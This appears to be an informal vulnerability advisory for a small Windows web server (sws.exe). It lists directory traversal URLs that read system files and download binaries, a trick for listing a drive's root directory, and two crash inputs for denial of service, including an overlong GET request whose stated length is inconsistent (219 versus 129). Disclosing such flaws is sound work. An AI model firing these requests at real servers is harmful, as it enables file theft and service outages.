description
-----------

i have found couple issues in this http-server. they 
are: directory traversal and DoS attacks. 


directory traversal
-------------------

1. you can read and download any file out of webroot:

http://hostname/../../windows/system.ini

or 

http://hostname/internal.sws?../../windows/system.ini


2. also you can download any binary file in this manner:

http://hostname/internal.sws?../../windows/calc.exe

this request will download program file calc.exe with 
name internal.sws

http://hostname/internal.sws?sws.exe

download webserver itself )).


3. directory listing out of webroot.

note: this bug will works if only `Allow directory 
listings' is turned on [ in default its do ].

http://hostname/.../

will print contents of root directory on that disk 
drive.


Denial of Service
-----------------

1. this url will crash webserver:

http://localhost/</


2. if you send GET request, that contains more >=219 
charakterz, then you will crash the server..

request example:

GET /fff[ x 129 ]ffff HTTP/1.0
